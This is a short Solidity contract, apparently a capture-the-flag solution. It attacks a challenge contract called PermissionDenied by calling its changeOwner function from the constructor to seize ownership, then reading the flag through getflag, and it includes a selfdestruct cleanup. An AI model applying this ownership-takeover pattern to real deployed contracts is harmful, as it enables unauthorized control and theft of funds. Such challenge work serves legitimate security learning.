// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./PermissionDenied.sol";


contract Attack {
    PermissionDenied private pd;
    string public data;
    address private owner; 

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    constructor(address _addr) {
        pd = PermissionDenied(_addr);
        pd.changeOwner();
        owner = msg.sender;
    }

    function hack() external {
        data = pd.getflag();  
    }
    
    function kill() external onlyOwner {
        selfdestruct(payable(owner));
    }
}